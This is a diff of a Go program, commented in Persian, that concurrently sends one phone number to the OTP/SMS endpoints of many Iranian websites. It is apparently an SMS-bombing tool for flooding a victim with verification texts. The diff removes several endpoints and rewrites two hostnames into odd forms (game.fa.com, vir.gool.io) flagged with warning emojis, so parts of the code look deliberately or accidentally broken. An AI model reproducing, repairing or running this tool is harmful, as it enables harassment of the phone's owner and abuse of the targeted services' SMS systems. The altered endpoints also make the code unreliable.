@@ -358,28 +358,8 @@ func main() {
 				formData.Set("_wp_http_referer", "/?login=true") // مقدار ثابت
 				formData.Set("container", "digits_protected") // مقدار ثابت
 				formData.Set("sub_action", "sms_otp")         // مقدار ثابت
-				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-
-
-			// api.cafebazaar.ir (POST JSON)
-			wg.Add(1)
-			tasks <- func() {
-				payload := map[string]interface{}{
-					"properties": map[string]interface{}{
-						"language":      2,
-						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-						"clientVersion": "web",                          // مقدار ثابت
-						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-					},
-					"singleRequest": map[string]interface{}{
-						"getOtpTokenRequest": map[string]interface{}{
-							"username": getPhoneNumber98NoZero(phone), // 98 + شماره بدون صفر اول
-						},
-					},
-				}
-				sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch)
-			}
+				sendFormRequest(ctx, "https://game.fa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}//⚠️⚠️⚠️⚠️⚠️
 
 			// account.api.balad.ir (POST JSON)
 			wg.Add(1)
@@ -399,7 +379,17 @@ func main() {
 				}
 				sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
 			}
-
+			
+                       // virgool.io (verify - POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"method":     "phone",                            // مقدار ثابت
+					"identifier": getPhoneNumberPlus98NoZero(phone), // +98 + شماره بدون صفر اول
+					"type":       "register",                         // مقدار ثابت
+				}
+				sendJSONRequest(ctx, "https://vir.gool.io/api2/app/auth/verify", payload, &wg, ch)
+			}//⚠️⚠️⚠️⚠️⚠️
 			// virgool.io (user-existence - POST JSON)
 			wg.Add(1)
 			tasks <- func() {
@@ -409,35 +399,6 @@ func main() {
 					"method":   "phone",                         // مقدار ثابت
 				}
 				sendJSONRequest(ctx, "https://virgool.io/api2/app/auth/user-existence", payload, &wg, ch)
-			}
-
-			// virgool.io (verify - POST JSON)
-			wg.Add(1)
-			tasks <- func() {
-				payload := map[string]interface{}{
-					"method":     "phone",                            // مقدار ثابت
-					"identifier": getPhoneNumberPlus98NoZero(phone), // +98 + شماره بدون صفر اول
-					"type":       "register",                         // مقدار ثابت
-				}
-				sendJSONRequest(ctx, "https://virgool.io/api2/app/auth/verify", payload, &wg, ch)
-			}
-
-			// pgemshop.com (POST Form)
-			wg.Add(1)
-			tasks <- func() {
-				formData := url.Values{}
-				formData.Set("action", "digits_check_mob")
-				formData.Set("countrycode", "+98")
-				formData.Set("mobileNo", phone) // شماره کامل
-				formData.Set("csrf", "0a60a620d9") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-				formData.Set("login", "2")
-				formData.Set("username", "")
-				formData.Set("email", "")
-				formData.Set("captcha", "")
-				formData.Set("captcha_ses", "")
-				formData.Set("json", "1")
-				formData.Set("whatsapp", "0")
-				sendFormRequest(ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 
 			// gifkart.com (SMS - POST Form)
@@ -488,14 +449,6 @@ func main() {
 				sendFormRequest(ctx, "https://mehreganit.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 
-			// core-api.mayava.ir (POST JSON)
-			wg.Add(1)
-			tasks <- func() {
-				payload := map[string]interface{}{
-					"mobile": phone, // شماره کامل
-				}
-				sendJSONRequest(ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch)
-			}
 	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---
 
 
